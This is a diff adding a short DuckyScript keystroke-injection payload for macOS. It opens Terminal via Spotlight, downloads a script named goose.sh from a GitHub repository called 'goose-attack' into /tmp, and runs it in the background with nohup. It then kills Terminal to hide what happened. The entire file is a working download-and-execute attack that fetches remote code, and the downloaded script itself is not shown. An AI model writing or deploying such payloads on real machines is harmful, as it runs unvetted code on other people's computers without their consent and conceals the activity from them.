@@ -1,0 +1,17 @@
+
+DEFAULTDELAY 100
+
+DELAY 200
+
+REM Open Terminal
+COMMAND SPACE
+STRINGLN terminal
+DELAY 400
+
+REM Download the shell file
+STRINGLN curl -L -o /tmp/goose.sh https://github.com/Gallus17/goose-attack/raw/refs/heads/main/goose.sh
+
+REM Execute the file in the background
+STRINGLN nohup bash /tmp/goose.sh &
+
+STRINGLN killall Terminal
